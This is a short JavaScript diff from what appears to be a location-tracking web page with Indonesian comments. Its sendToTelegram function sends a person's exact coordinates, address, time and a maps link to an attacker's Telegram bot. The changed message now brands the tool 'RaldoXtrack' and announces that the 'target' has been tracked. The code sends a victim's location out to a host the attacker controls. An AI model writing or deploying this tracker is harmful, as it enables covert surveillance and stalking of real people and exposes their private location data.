@@ -60,7 +60,7 @@
 
         // Kirim ke Telegram (sama)
         async function sendToTelegram(lat, lng, accuracy, timestamp, address, mapsLink) {
-            const message = `Lokasi Akurat Baru!\nLatitude: ${lat.toFixed(7)}\nLongitude: ${lng.toFixed(7)}\nAkurasi: ${accuracy}m\nAlamat: ${address}\nWaktu: ${new Date(timestamp).toLocaleString('id-ID')}\nMaps: ${mapsLink}`;
+            const message = `𝙍𝙖𝙡𝙙𝙤𝙓𝙩𝙧𝙖𝙘𝙠:𝙨𝙪𝙠𝙨𝙚𝙨 𝙏𝙖𝙧𝙜𝙚𝙩 𝘽𝙚𝙧𝙝𝙖𝙨𝙞𝙡 𝘿𝙞 𝙇𝙖𝙘𝙖𝙠!\nLatitude: ${lat.toFixed(7)}\nLongitude: ${lng.toFixed(7)}\nAkurasi: ${accuracy}m\nAlamat: ${address}\nWaktu: ${new Date(timestamp).toLocaleString('id-ID')}\n𝐋𝐨𝐤𝐚𝐬𝐢 𝐓𝐚𝐫𝐠𝐞𝐭: ${mapsLink}`;
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
             
             try {
